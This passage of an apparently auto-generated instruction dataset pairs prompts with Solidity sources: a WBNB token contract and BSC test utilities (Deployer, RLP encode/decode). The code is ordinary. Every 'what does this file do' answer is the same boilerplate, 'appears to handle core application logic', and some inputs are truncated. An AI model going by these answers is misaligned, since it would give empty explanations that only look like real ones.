{\n        allowance[msg.sender][guy] = wad;\n        Approval(msg.sender, guy, wad);\n        return true;\n    }\n\n    function transfer(address dst, uint wad) public returns (bool) {\n        return transferFrom(msg.sender, dst, wad);\n    }\n\n    function transferFrom(address src, address dst, uint wad)\n    public\n    returns (bool)\n    {\n        require(balanceOf[src] >= wad);\n\n        if (src != msg.sender && allowance[src][msg.sender] != uint(-1)) {\n            require(allowance[src][msg.sender] >= wad);\n            allowance[src][msg.sender] -= wad;\n        }\n\n        balanceOf[src] -= wad;\n        balanceOf[dst] += wad;\n\n        Transfer(src, dst, wad);\n\n        return true;\n    }\n}\n\n```"}
{"instruction": "What does the file WBNB.sol do?", "input": "```sol\npragma solidity ^0.4.18;\n\ncontract WBNB {\n    string public name     = \"Wrapped BNB\";\n    string public symbol   = \"WBNB\";\n    uint8  public decimals = 18;\n\n    event  Approval(address indexed src, address indexed guy, uint wad);\n    event  Transfer(address indexed src, address indexed dst, uint wad);\n    event  Deposit(address indexed dst, uint wad);\n    event  Withdrawal(address indexed src, uint wad);\n\n    mapping (address => uint)                       public  balanceOf;\n    mapping (address => mapping (address => uint))  public  allowance;\n\n    function() public payable {\n        deposit();\n    }\n    function deposit() public payable {\n        balanceOf[msg.sender] += msg.value;\n        Deposit(msg.sender, msg.value);\n    }\n    function withdraw(uint wad) public {\n        require(balanceOf[msg.sender] >= wad);\n        balanceOf[msg.sender] -= wad;\n        msg.sender.transfer(wad);\n        Withdrawal(msg.sender, wad);\n    }\n\n    function totalSupply() public view returns (uint) {\n        return this.balance;\n    }\n\n    function approve(address guy, uint wad) public returns (bool) {\n        allowance[msg.sender][guy] = wad;\n        Approval(msg.sender, guy, wad);\n        return true;\n    }\n\n    function transfer(address dst, uint wad) public returns (bool) {\n        return transferFrom(msg.sender, dst, wad);\n    }\n\n    function transferFrom(address src, address dst, uint wad)\n    public\n    returns (bool)\n    {\n        require(balanceOf[src] >= wad);\n\n        if (src != msg.sender && allowance[src][msg.sender] != uint(-1)) {\n            require(allowance[src][msg.sender] >= wad);\n            allowance[src][msg.sender] -= wad;\n        }\n\n        balanceOf[src] -= wad;\n        balanceOf[dst] += wad;\n\n        Transfer(src, dst, wad);\n\n        return true;\n    }\n}\n\n```", "output": "This file `WBNB.sol` is part of the wbnb project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for Deployer.sol which is part of the utils project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\test\\utils\\Deployer.sol`:\n\n```sol\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\n\nimport \"./interface/IBSCValidatorSet.sol\";\nimport \"./interface/ICrossChain.sol\";\nimport \"./interface/IGovHub.sol\";\nimport \"./interface/IRelayerHub.sol\";\nimport \"./interface/IRelayerIncentivize.sol\";\nimport \"./interface/ISlashIndicator.sol\";\nimport \"./interface/IStaking.sol\";\nimport \"./interface/ISystemReward.sol\";\nimport \"./interface/ITokenHub.sol\";\nimport \"./interface/ITokenManager.sol\";\nimport \"./interface/ITendermintLightClient.sol\";\nimport \"./interface/IStakeHub.sol\";\nimport \"./interface/IStakeCredit.sol\";\nimport \"./interface/IBSCGovernor.sol\";\nimport \"./interface/IGovToken.sol\";\nimport \"./interface/IBSCTimelock.sol\";\nimport \"./interface/ITokenRecoverPortal.sol\";\nimport \"./RLPEncode.sol\";\nimport \"./RLPDecode.sol\";\n\ncontract Deployer is Test {\n    using RLPEncode for *;\n\n    // system contract address\n    address payable public constant VALIDATOR_CONTRACT_ADDR = payable(0x0000000000000000000000000000000000001000);\n    address public constant SLASH_CONTRACT_ADDR = payable(0x0000000000000000000000000000000000001001);\n    address payable public constant SYSTEM_REWARD_ADDR = payable(0x0000000000000000000000000000000000001002);\n    address public constant LIGHT_CLIENT_ADDR = payable(0x0000000000000000000000000000000000001003);\n    address payable public constant TOKEN_HUB_ADDR = payable(0x0000000000000000000000000000000000001004);\n    address payable public constant INCENTIVIZE_ADDR = payable(0x0000000000000000000000000000000000001005);\n    address public constant RELAYERHUB_CONTRACT_ADDR = payable(0x0000000000000000000000000000000000001006);\n    address public constant GOV_HUB_ADDR = payable(0x0000000000000000000000000000000000001007);\n    address public constant TOKEN_MANAGER_ADDR = payable(0x0000000000000000000000000000000000001008);\n    address public constant CROSS_CHAIN_CONTRACT_ADDR = payable(0x0000000000000000000000000000000000002000);\n    address payable public constant STAKING_CONTRACT_ADDR = payable(0x0000000000000000000000000000000000002001);\n    address payable public constant STAKE_HUB_ADDR = payable(0x0000000000000000000000000000000000002002);\n    address payable public constant STAKE_CREDIT_ADDR = payable(0x0000000000000000000000000000000000002003);\n    address payable public constant GOVERNOR_ADDR = payable(0x0000000000000000000000000000000000002004);\n    address public constant GOV_TOKEN_ADDR = payable(0x0000000000000000000000000000000000002005);\n    address payable public constant TIMELOCK_ADDR = payable(0x0000000000000000000000000000000000002006);\n    address public constant TOKEN_RECOVER_PORTAL_ADDR = payable(0x0000000000000000000000000000000000003000);\n\n    uint8 public constant BIND_CHANNELID = 0x01;\n    uint8 public constant TRANSFER_IN_CHANNELID = 0x02;\n    uint8 public constant TRANSFER_OUT_CHANNELID = 0x03;\n    uint8 public constant MIRROR_CHANNELID = 0x04;\n    uint8 public constant SYNC_CHANNELID = 0x05;\n    uint8 public constant STAKING_CHANNELID = 0x08;\n    uint8 public constant GOV_CHANNELID = 0x09;\n    uint8 public constant SLASH_CHANNELID = 0x0b;\n    uint8 public constant CROSS_STAKE_CHANNELID = 0x10;\n    uint8 public constant BC_FUSION_CHANNELID = 0x11;\n\n    BSCValidatorSet public bscValidatorSet;\n    SlashIndicator public slashIndicator;\n    SystemReward public systemReward;\n    TendermintLightClient public lightClient;\n    TokenHub public tokenHub;\n    RelayerIncentivize public incentivize;\n    RelayerHub public relayerHub;\n    GovHub public govHub;\n    TokenManager public tokenManager;\n    CrossChain public crossChain;\n    Staking public staking;\n    StakeHub public stakeHub;\n    StakeCredit public stakeCredit;\n    BSCGovernor public governor;\n    GovToken public govToken;\n    BSCTimelock public timelock;\n    TokenRecoverPortal public tokenRecoverPortal;\n\n    address payable public relayer;\n\n    bytes32 internal nextUser = keccak256(abi.encodePacked(\"user address\"));\n\n    event paramChange(string key, bytes value);\n\n    constructor() {\n        // please use the following command to run the test on mainnet fork instead: forge test --rpc-url ${fork_url}\n        // vm.createSelectFork(\"bsc\");\n        assertEq(block.chainid, 56);\n\n        // setup system contracts\n        bscValidatorSet = BSCValidatorSet(VALIDATOR_CONTRACT_ADDR);\n        vm.label(address(bscValidatorSet), \"Validator\");\n        slashIndicator = SlashIndicator(SLASH_CONTRACT_ADDR);\n        vm.label(address(slashIndicator), \"SlashIndicator\");\n        systemReward = SystemReward(SYSTEM_REWARD_ADDR);\n        vm.label(address(systemReward), \"SystemReward\");\n        lightClient = TendermintLightClient(LIGHT_CLIENT_ADDR);\n        vm.label(address(lightClient), \"LightClient\");\n        tokenHub = TokenHub(TOKEN_HUB_ADDR);\n        vm.label(address(tokenHub), \"TokenHub\");\n        incentivize = RelayerIncentivize(INCENTIVIZE_ADDR);\n        vm.label(address(incentivize), \"RelayerIncentivize\");\n        relayerHub = RelayerHub(RELAYERHUB_CONTRACT_ADDR);\n        vm.label(address(relayerHub), \"RelayerHub\");\n        govHub = GovHub(GOV_HUB_ADDR);\n        vm.label(address(govHub), \"GovHub\");\n        tokenManager = TokenManager(TOKEN_MANAGER_ADDR);\n        vm.label(address(tokenManager), \"TokenManager\");\n        crossChain = CrossChain(CROSS_CHAIN_CONTRACT_ADDR);\n        vm.label(address(crossChain), \"CrossChain\");\n        staking = Staking(STAKING_CONTRACT_ADDR);\n        vm.label(address(staking), \"Staking\");\n        stakeHub = StakeHub(STAKE_HUB_ADDR);\n        vm.label(address(stakeHub), \"StakeHub\");\n        stakeCredit = StakeCredit(STAKE_CREDIT_ADDR);\n        vm.label(address(stakeCredit), \"StakeCredit\");\n        governor = BSCGovernor(GOVERNOR_ADDR);\n        vm.label(address(governor), \"BSCGovernor\");\n        govToken = GovToken(GOV_TOKEN_ADDR);\n        vm.label(address(govToken), \"GovToken\");\n        timelock = BSCTimelock(TIMELOCK_ADDR);\n        vm.label(address(timelock), \"BSCTimelock\");\n        tokenRecoverPortal = TokenRecoverPortal(TOKEN_RECOVER_PORTAL_ADDR);\n        vm.label(address(tokenRecoverPortal), \"TokenRecoverPortal\");\n\n        // set the latest code\n        bytes memory deployedCode = vm.getDeployedCode(\"BSCValidatorSet.sol:BSCValidatorSet\");\n        vm.etch(VALIDATOR_CONTRACT_ADDR, deployedCode);\n        deployedCode = vm.getDeployedCode(\"SlashIndicator.sol:SlashIndicator\");\n        vm.etch(SLASH_CONTRACT_ADDR, deployedCode);\n        deployedCode = vm.getDeployedCode(\"SystemReward.sol:SystemReward\");\n        vm.etch(SYSTEM_REWARD_ADDR, deployedCode);\n        deployedCode = vm.getDeployedCode(\"TendermintLightClient.sol:TendermintLightClient\");\n        vm.etch(LIGHT_CLIENT_ADDR, deployedCode);\n        deployedCode = vm.getDeployedCode(\"TokenHub.sol:TokenHub\");\n        vm.etch(TOKEN_HUB_ADDR, deployedCode);\n        deployedCode = vm.getDeployedCode(\"RelayerIncentivize.sol:RelayerIncentivize\");\n        vm.etch(INCENTIVIZE_ADDR, deployedCode);\n        deployedCode = vm.getDeployedCode(\"RelayerHub.sol:RelayerHub\");\n        vm.etch(RELAYERHUB_CONTRACT_ADDR, deployedCode);\n        deployedCode = vm.getDeployedCode(\"GovHub.sol:GovHub\");\n        vm.etch(GOV_HUB_ADDR, deployedCode);\n        deployedCode = vm.getDeployedCode(\"TokenManager.sol:TokenManager\");\n        vm.etch(TOKEN_MANAGER_ADDR, deployedCode);\n        deployedCode = vm.getDeployedCode(\"CrossChain.sol:CrossChain\");\n        vm.etch(CROSS_CHAIN_CONTRACT_ADDR, deployedCode);\n        deployedCode = vm.getDeployedCode(\"Staking.sol:Staking\");\n        vm.etch(STAKING_CONTRACT_ADDR, deployedCode);\n        deployedCode = vm.getDeployedCode(\"StakeHub.sol:StakeHub\");\n        vm.etch(STAKE_HUB_ADDR, deployedCode);\n        deployedCode = vm.getDeployedCode(\"StakeCredit.sol:StakeCredit\");\n        vm.etch(STAKE_CREDIT_ADDR, deployedCode);\n        deployedCode = vm.getDeployedCode(\"BSCGovernor.sol:BSCGovernor\");\n        vm.etch(GOVERNOR_ADDR, deployedCode);\n        deployedCode = vm.getDeployedCode(\"GovToken.sol:GovToken\");\n        vm.etch(GOV_TOKEN_ADDR, deployedCode);\n        deployedCode = vm.getDeployedCode(\"BSCTimelock.sol:BSCTimelock\");\n        vm.etch(TIMELOCK_ADDR, deployedCode);\n        deployedCode = vm.getDeployedCode(\"TokenRecoverPortal.sol:TokenRecoverPortal\");\n        vm.etch(TOKEN_RECOVER_PORTAL_ADDR, deployedCode);\n\n        relayer = payable(0xb005741528b86F5952469d80A8614591E3c5B632); // whitelabel relayer on mainnet\n        vm.label(relayer, \"relayer\");\n    }\n\n    function _getNextUserAddress() internal returns (address payable) {\n        address payable user = payable(address(uint160(uint256(nextUser))));\n        nextUser = keccak256(abi.encodePacked(nextUser));\n        vm.deal(user, 10_000 ether);\n        return user;\n    }\n\n    function _updateParamByGovHub(bytes memory key, bytes memory value, address addr) internal {\n        vm.startPrank(address(TIMELOCK_ADDR));\n        govHub.updateParam(string(key), value, addr);\n        vm.stopPrank();\n    }\n\n    function _createValidator(uint256 delegation)\n        internal\n        returns (address operatorAddress, address consensusAddress, address credit, bytes memory voteAddress)\n    {\n        uint256 toLock = stakeHub.LOCK_AMOUNT();\n\n        operatorAddress = _getNextUserAddress();\n        StakeHub.Commission memory commission = StakeHub.Commission({ rate: 10, maxRate: 100, maxChangeRate: 5 });\n        StakeHub.Description memory description = StakeHub.Description({\n            moniker: string.concat(\"T\", vm.toString(uint24(uint160(operatorAddress)))),\n            identity: vm.toString(operatorAddress),\n            website: vm.toString(operatorAddress),\n            details: vm.toString(operatorAddress)\n        });\n        voteAddress = bytes.concat(\n            hex\"00000000000000000000000000000000000000000000000000000000\", abi.encodePacked(operatorAddress)\n        );\n        bytes memory blsProof = new bytes(96);\n        consensusAddress = address(uint160(uint256(keccak256(voteAddress))));\n\n        vm.prank(operatorAddress);\n        stakeHub.createValidator{ value: delegation + toLock }(\n            consensusAddress, voteAddress, blsProof, commission, description\n        );\n\n        credit = stakeHub.getValidatorCreditContract(operatorAddress);\n    }\n\n    function _batchCreateValidators(uint256 number)\n        internal\n        returns (\n            address[] memory operatorAddrs,\n            address[] memory consensusAddrs,\n            uint64[] memory votingPowers,\n            bytes[] memory voteAddrs\n        )\n    {\n        operatorAddrs = new address[](number);\n        consensusAddrs = new address[](number);\n        votingPowers = new uint64[](number);\n        voteAddrs = new bytes[](number);\n\n        address operatorAddress;\n        address consensusAddress;\n        uint64 votingPower;\n        bytes memory voteAddress;\n        for (uint256 i; i < number; ++i) {\n            votingPower = 2000 * 1e8;\n            (operatorAddress, consensusAddress,, voteAddress) = _createValidator(uint256(votingPower) * 1e10);\n\n            operatorAddrs[i] = operatorAddress;\n            consensusAddrs[i] = consensusAddress;\n            votingPowers[i] = votingPower;\n            voteAddrs[i] = voteAddress;\n        }\n    }\n}\n\n```"}
{"instruction": "What does the file Deployer.sol do?", "input": "```sol\npragma solidity ^0.8.10;\n\nimport \"forge-std/Test.sol\";\n\nimport \"./interface/IBSCValidatorSet.sol\";\nimport \"./interface/ICrossChain.sol\";\nimport \"./interface/IGovHub.sol\";\nimport \"./interface/IRelayerHub.sol\";\nimport \"./interface/IRelayerIncentivize.sol\";\nimport \"./interface/ISlashIndicator.sol\";\nimport \"./interface/IStaking.sol\";\nimport \"./interface/ISystemReward.sol\";\nimport \"./interface/ITokenHub.sol\";\nimport \"./interface/ITokenManager.sol\";\nimport \"./interface/ITendermintLightClient.sol\";\nimport \"./interface/IStakeHub.sol\";\nimport \"./interface/IStakeCredit.sol\";\nimport \"./interface/IBSCGovernor.sol\";\nimport \"./interface/IGovToken.sol\";\nimport \"./interface/IBSCTimelock.sol\";\nimport \"./interface/ITokenRecoverPortal.sol\";\nimport \"./RLPEncode.sol\";\nimport \"./RLPDecode.sol\";\n\ncontract Deployer is Test {\n    using RLPEncode for *;\n\n    // system contract address\n    address payable public constant VALIDATOR_CONTRACT_ADDR = payable(0x0000000000000000000000000000000000001000);\n    address public constant SLASH_CONTRACT_ADDR = payable(0x0000000000000000000000000000000000001001);\n    address payable public constant SYSTEM_REWARD_ADDR = payable(0x0000000000000000000000000000000000001002);\n    address public constant LIGHT_CLIENT_ADDR = payable(0x0000000000000000000000000000000000001003);\n    address payable public constant TOKEN_HUB_ADDR = payable(0x0000000000000000000000000000000000001004);\n    address payable public constant INCENTIVIZE_ADDR = payable(0x0000000000000000000000000000000000001005);\n    address public constant RELAYERHUB_CONTRACT_ADDR = payable(0x0000000000000000000000000000000000001006);\n    address public constant GOV_HUB_ADDR = payable(0x0000000000000000000000000000000000001007);\n    address public constant TOKEN_MANAGER_ADDR = payable(0x0000000000000000000000000000000000001008);\n    address public constant CROSS_CHAIN_CONTRACT_ADDR = payable(0x0000000000000000000000000000000000002000);\n    address payable public constant STAKING_CONTRACT_ADDR = payable(0x\n```", "output": "This file `Deployer.sol` is part of the utils project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for RLPDecode.sol which is part of the utils project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\test\\utils\\RLPDecode.sol`:\n\n```sol\npragma solidity ^0.8.10;\n\n/**\n * @dev RLP decoding library.\n * This file is a bit modified from the original version in `contracts/lib` because of different Solidity versions.\n */\nlibrary RLPDecode {\n    uint8 constant STRING_SHORT_START = 0x80;\n    uint8 constant STRING_LONG_START = 0xb8;\n    uint8 constant LIST_SHORT_START = 0xc0;\n    uint8 constant LIST_LONG_START = 0xf8;\n\n    uint8 constant WORD_SIZE = 32;\n\n    struct RLPItem {\n        uint256 len;\n        uint256 memPtr;\n    }\n\n    struct Iterator {\n        RLPItem item; // Item that's being iterated over.\n        uint256 nextPtr; // Position of the next item in the list.\n    }\n\n    function next(Iterator memory self) internal pure returns (RLPItem memory) {\n        require(hasNext(self));\n\n        uint256 ptr = self.nextPtr;\n        uint256 itemLength = _itemLength(ptr);\n        self.nextPtr = ptr + itemLength;\n\n        return RLPItem(itemLength, ptr);\n    }\n\n    function hasNext(Iterator memory self) internal pure returns (bool) {\n        RLPItem memory item = self.item;\n        return self.nextPtr < item.memPtr + item.len;\n    }\n\n    function toRLPItem(bytes memory self) internal pure returns (RLPItem memory) {\n        uint256 memPtr;\n        assembly {\n            memPtr := add(self, 0x20)\n        }\n\n        return RLPItem(self.length, memPtr);\n    }\n\n    function iterator(RLPItem memory self) internal pure returns (Iterator memory) {\n        require(isList(self));\n\n        uint256 ptr = self.memPtr + _payloadOffset(self.memPtr);\n        return Iterator(self, ptr);\n    }\n\n    function rlpLen(RLPItem memory item) internal pure returns (uint256) {\n        return item.len;\n    }\n\n    function payloadLen(RLPItem memory item) internal pure returns (uint256) {\n        return item.len - _payloadOffset(item.memPtr);\n    }\n\n    function toList(RLPItem memory item) internal pure returns (RLPItem[] memory) {\n        require(isList(item));\n\n        uint256 items = numItems(item);\n        RLPItem[] memory result = new RLPItem[](items);\n\n        uint256 memPtr = item.memPtr + _payloadOffset(item.memPtr);\n        uint256 dataLen;\n        for (uint256 i = 0; i < items; ++i) {\n            dataLen = _itemLength(memPtr);\n            result[i] = RLPItem(dataLen, memPtr);\n            memPtr = memPtr + dataLen;\n        }\n\n        return result;\n    }\n\n    function isList(RLPItem memory item) internal pure returns (bool) {\n        if (item.len == 0) return false;\n\n        uint8 byte0;\n        uint256 memPtr = item.memPtr;\n        assembly {\n            byte0 := byte(0, mload(memPtr))\n        }\n\n        if (byte0 < LIST_SHORT_START) {\n            return false;\n        }\n        return true;\n    }\n\n    function toRlpBytes(RLPItem memory item) internal pure returns (bytes memory) {\n        bytes memory result = new bytes(item.len);\n        if (result.length == 0) return result;\n\n        uint256 ptr;\n        assembly {\n            ptr := add(0x20, result)\n        }\n\n        copy(item.memPtr, ptr, item.len);\n        return result;\n    }\n\n    function toBoolean(RLPItem memory item) internal pure returns (bool) {\n        require(item.len == 1);\n        uint256 result;\n        uint256 memPtr = item.memPtr;\n        assembly {\n            result := byte(0, mload(memPtr))\n        }\n\n        if (result == 0 || result == STRING_SHORT_START) {\n            return false;\n        } else {\n            return true;\n        }\n    }\n\n    function toAddress(RLPItem memory item) internal pure returns (address) {\n        // 1 byte for the length prefix\n        require(item.len == 21);\n\n        return address(uint160(toUint(item)));\n    }\n\n    function toUint(RLPItem memory item) internal pure returns (uint256) {\n        require(item.len > 0 && item.len <= 33);\n\n        uint256 offset = _payloadOffset(item.memPtr);\n        require(item.len >= offset, \"length is less than offset\");\n        uint256 len = item.len - offset;\n\n        uint256 result;\n        uint256 memPtr = item.memPtr + offset;\n        assembly {\n            result := mload(memPtr)\n\n            // shift to the correct location if necessary\n            if lt(len, 32) { result := div(result, exp(256, sub(32, len))) }\n        }\n\n        return result;\n    }\n\n    // enforces 32 byte length\n    function toUintStrict(RLPItem memory item) internal pure returns (uint256) {\n        // one byte prefix\n        require(item.len == 33);\n\n        uint256 result;\n        uint256 memPtr = item.memPtr + 1;\n        assembly {\n            result := mload(memPtr)\n        }\n\n        return result;\n    }\n\n    function toBytes(RLPItem memory item) internal pure returns (bytes memory) {\n        require(item.len > 0);\n\n        uint256 offset = _payloadOffset(item.memPtr);\n        uint256 len = item.len - offset; // data length\n        bytes memory result = new bytes(len);\n\n        uint256 destPtr;\n        assembly {\n            destPtr := add(0x20, result)\n        }\n\n        copy(item.memPtr + offset, destPtr, len);\n        return result;\n    }\n\n    function numItems(RLPItem memory item) private pure returns (uint256) {\n        if (item.len == 0) return 0;\n\n        uint256 count = 0;\n        uint256 currPtr = item.memPtr + _payloadOffset(item.memPtr);\n        uint256 endPtr = item.memPtr + item.len;\n        while (currPtr < endPtr) {\n            currPtr = currPtr + _itemLength(currPtr); // skip over an item\n            ++count;\n        }\n\n        return count;\n    }\n\n    function _itemLength(uint256 memPtr) private pure returns (uint256) {\n        uint256 itemLen;\n        uint256 byte0;\n        assembly {\n            byte0 := byte(0, mload(memPtr))\n        }\n\n        if (byte0 < STRING_SHORT_START) {\n            itemLen = 1;\n        } else if (byte0 < STRING_LONG_START) {\n            itemLen = byte0 - STRING_SHORT_START + 1;\n        } else if (byte0 < LIST_SHORT_START) {\n            uint256 dataLen;\n            assembly {\n                let byteLen := sub(byte0, 0xb7) // # of bytes the actual length is\n                memPtr := add(memPtr, 1) // skip over the first byte\n\n                /* 32 byte word size */\n                dataLen := div(mload(memPtr), exp(256, sub(32, byteLen))) // right shifting to get the len\n                itemLen := add(dataLen, add(byteLen, 1))\n            }\n            require(itemLen >= dataLen, \"addition overflow\");\n        } else if (byte0 < LIST_LONG_START) {\n            itemLen = byte0 - LIST_SHORT_START + 1;\n        } else {\n            uint256 dataLen;\n            assembly {\n                let byteLen := sub(byte0, 0xf7)\n                memPtr := add(memPtr, 1)\n\n                dataLen := div(mload(memPtr), exp(256, sub(32, byteLen))) // right shifting to the correct length\n                itemLen := add(dataLen, add(byteLen, 1))\n            }\n            require(itemLen >= dataLen, \"addition overflow\");\n        }\n\n        return itemLen;\n    }\n\n    // @return number of bytes until the data\n    function _payloadOffset(uint256 memPtr) private pure returns (uint256) {\n        uint256 byte0;\n        assembly {\n            byte0 := byte(0, mload(memPtr))\n        }\n\n        if (byte0 < STRING_SHORT_START) {\n            return 0;\n        } else if (byte0 < STRING_LONG_START || (byte0 >= LIST_SHORT_START && byte0 < LIST_LONG_START)) {\n            return 1;\n        } else if (\n            byte0 < LIST_SHORT_START // being explicit\n        ) {\n            return byte0 - (STRING_LONG_START - 1) + 1;\n        } else {\n            return byte0 - (LIST_LONG_START - 1) + 1;\n        }\n    }\n\n    /*\n    * @param src Pointer to source\n    * @param dest Pointer to destination\n    * @param len Amount of memory to copy from the source\n    */\n    function copy(uint256 src, uint256 dest, uint256 len) private pure {\n        if (len == 0) return;\n\n        // copy as many word sizes as possible\n        for (; len >= WORD_SIZE; len -= WORD_SIZE) {\n            assembly {\n                mstore(dest, mload(src))\n            }\n\n            src += WORD_SIZE;\n            dest += WORD_SIZE;\n        }\n\n        // left over bytes. Mask is used to remove unwanted bytes from the word\n        uint256 mask = 256 ** (WORD_SIZE - len) - 1;\n        assembly {\n            let srcpart := and(mload(src), not(mask)) // zero out src\n            let destpart := and(mload(dest), mask) // retrieve the bytes\n            mstore(dest, or(destpart, srcpart))\n        }\n    }\n}\n\n```"}
{"instruction": "What does the file RLPDecode.sol do?", "input": "```sol\npragma solidity ^0.8.10;\n\n/**\n * @dev RLP decoding library.\n * This file is a bit modified from the original version in `contracts/lib` because of different Solidity versions.\n */\nlibrary RLPDecode {\n    uint8 constant STRING_SHORT_START = 0x80;\n    uint8 constant STRING_LONG_START = 0xb8;\n    uint8 constant LIST_SHORT_START = 0xc0;\n    uint8 constant LIST_LONG_START = 0xf8;\n\n    uint8 constant WORD_SIZE = 32;\n\n    struct RLPItem {\n        uint256 len;\n        uint256 memPtr;\n    }\n\n    struct Iterator {\n        RLPItem item; // Item that's being iterated over.\n        uint256 nextPtr; // Position of the next item in the list.\n    }\n\n    function next(Iterator memory self) internal pure returns (RLPItem memory) {\n        require(hasNext(self));\n\n        uint256 ptr = self.nextPtr;\n        uint256 itemLength = _itemLength(ptr);\n        self.nextPtr = ptr + itemLength;\n\n        return RLPItem(itemLength, ptr);\n    }\n\n    function hasNext(Iterator memory self) internal pure returns (bool) {\n        RLPItem memory item = self.item;\n        return self.nextPtr < item.memPtr + item.len;\n    }\n\n    function toRLPItem(bytes memory self) internal pure returns (RLPItem memory) {\n        uint256 memPtr;\n        assembly {\n            memPtr := add(self, 0x20)\n        }\n\n        return RLPItem(self.length, memPtr);\n    }\n\n    function iterator(RLPItem memory self) internal pure returns (Iterator memory) {\n        require(isList(self));\n\n        uint256 ptr = self.memPtr + _payloadOffset(self.memPtr);\n        return Iterator(self, ptr);\n    }\n\n    function rlpLen(RLPItem memory item) internal pure returns (uint256) {\n        return item.len;\n    }\n\n    function payloadLen(RLPItem memory item) internal pure returns (uint256) {\n        return item.len - _payloadOffset(item.memPtr);\n    }\n\n    function toList(RLPItem memory item) internal pure returns (RLPItem[] memory) {\n        require(isList(item));\n\n        uint256 items = numItems(item);\n        RLPItem[] memory result = new R\n```", "output": "This file `RLPDecode.sol` is part of the utils project. Based on the code structure, it appears to handle core application logic."}
{"instruction": "Show me the code for RLPEncode.sol which is part of the utils project.", "input": "", "output": "Here's the code for `projects\\active\\binance\\bsc-genesis-contract\\test\\utils\\RLPEncode.sol`:\n\n```sol\npragma solidity ^0.8.10;\n\n/**\n * @dev RLP encoding library.\n * This file is a bit modified from the original version in `contracts/lib` because of different Solidity versions.\n */\nlibrary RLPEncode {\n    uint8 constant STRING_OFFSET = 0x80;\n    uint8 constant LIST_OFFSET = 0xc0;\n\n    /**\n     * @notice Encode string item\n     * @param self The string (ie. byte array) item to encode\n     * @return The RLP encoded string in bytes\n     */\n    function encodeBytes(bytes memory self) internal pure returns (bytes memory) {\n        if (self.length == 1 && self[0] <= 0x7f) {\n            return self;\n        }\n        return mergeBytes(encodeLength(self.length, STRING_OFFSET), self);\n    }\n\n    /**\n     * @notice Encode address\n     * @param self The address to encode\n     * @return The RLP encoded address in bytes\n     */\n    function encodeAddress(address self) internal pure returns (bytes memory) {\n        bytes memory b;\n        assembly {\n            b := mload(0x40)\n            mstore(b, 0x20)\n            mstore(add(b, 20), xor(0x140000000000000000000000000000000000000000, self))\n            mstore(0x40, add(b, 0x40))\n        }\n        return encodeBytes(b);\n    }\n\n    /**\n     * @notice Encode uint\n     * @param self The uint to encode\n     * @return The RLP encoded uint in bytes\n     */\n    function encodeUint(uint256 self) internal pure returns (bytes memory) {\n        return encodeBytes(toBinary(self));\n    }\n\n    /**\n     * @notice Encode int\n     * @param self The int to encode\n     * @return The RLP encoded int in bytes\n     */\n    function encodeInt(int256 self) internal pure returns (bytes memory) {\n        return encodeUint(uint256(self));\n    }\n\n    /**\n     * @notice Encode bool\n     * @param self The bool to encode\n     * @return The RLP encoded bool in bytes\n     */\n    function encodeBool(bool self) internal pure returns (bytes memory) {\n        bytes memory rs = new bytes(1);\n        rs[0] = (self ? bytes1(0x01) : bytes1(0x80));\n        return rs;\n    }\n\n    /**\n     * @notice Encode list of items\n     * @param self The list of items to encode, each item in list must be already encoded\n     * @return The RLP encoded list of items in bytes\n     */\n    function encodeList(bytes[] memory self) internal pure returns (bytes memory) {\n        if (self.length == 0) {\n            return new bytes(0);\n        }\n        bytes memory payload = self[0];\n        for (uint256 i = 1; i < self.length; ++i) {\n            payload = mergeBytes(payload, self[i]);\n        }\n        return mergeBytes(encodeLength(payload.length, LIST_OFFSET), payload);\n    }\n\n    /**\n     * @notice Concat two bytes arrays\n     * @param _preBytes The first bytes array\n     * @param _postBytes The second bytes array\n     * @return The merged bytes array\n     */\n    function mergeBytes(bytes memory _preBytes, bytes memory _postBytes) internal pure returns (bytes memory) {\n        bytes memory tempBytes;\n\n        assembly {\n            // Get a location of some free memory and store it in tempBytes as\n            // Solidity does for memory variables.\n            tempBytes := mload(0x40)\n\n            // Store the length of the first bytes array at the beginning of\n            // the memory for tempBytes.\n            let length := mload(_preBytes)\n            mstore(tempBytes, length)\n\n            // Maintain a memory counter for the current write location in the\n            // temp bytes array by adding the 32 bytes for the array length to\n            // the starting location.\n            let mc := add(tempBytes, 0x20)\n            // Stop copying when the memory counter reaches the length of the\n            // first bytes array.\n            let end := add(mc, length)\n\n            for {\n                // Initialize a copy counter to the start of the _preBytes data,\n                // 32 bytes into its memory.\n                let cc := add(_preBytes, 0x20)\n            } lt(mc, end) {\n                // Increase both counters by 32 bytes each iteration.\n                mc := add(mc, 0x20)\n                cc := add(cc, 0x20)\n            } {\n                // Write the _preBytes data into the tempBytes memory 32 bytes\n                // at a time.\n                mstore(mc, mload(cc))\n            }\n\n            // Add the length of _postBytes to the current length of tempBytes\n            // and store it as the new length in the first 32 bytes of the\n            // tempBytes memory.\n            length := mload(_postBytes)\n            mstore(tempBytes, add(length, mload(tempBytes)))\n\n            // Move the memory counter back from a multiple of 0x20 to the\n            // actual end of the _preBytes data.\n            mc := end\n            // Stop copying when the memory counter reaches the new combined\n            // length of the arrays.\n            end := add(mc, length)\n\n            for { let cc := add(_postBytes, 0x20) } lt(mc, end) {\n                mc := add(mc, 0x20)\n                cc := add(cc, 0x20)\n            } { mstore(mc, mload(cc)) }\n\n            // Update the free-memory pointer by padding our last write location\n            // to 32 bytes: add 31 bytes to the end of tempBytes to move to the\n            // next 32 byte block, then round down to the nearest multiple of\n            // 32. If the sum of the length of the two arrays is zero then add\n            // one before rounding down to leave a blank 32 bytes (the length block with 0).\n            mstore(\n                0x40,\n                and(\n                    add(add(end, iszero(add(length, mload(_preBytes)))), 31),\n                    not(31) // Round down to the nearest 32 bytes.\n                )\n            )\n        }\n\n        return tempBytes;\n    }\n\n    /**\n     * @notice Encode the first byte, followed by the `length` in binary form if `length` is more than 55.\n     * @param length The length of the string or the payload\n     * @param offset `STRING_OFFSET` if item is string, `LIST_OFFSET` if item is list\n     * @return RLP encoded bytes\n     */\n    function encodeLength(uint256 length, uint256 offset) internal pure returns (bytes memory) {\n        require(length < 256 ** 8, \"input too long\");\n        bytes memory rs = new bytes(1);\n        if (length <= 55) {\n            rs[0] = bytes1(uint8(length + offset));\n            return rs;\n        }\n        bytes memory bl = toBinary(length);\n        rs[0] = bytes1(uint8(bl.length + offset + 55));\n        return 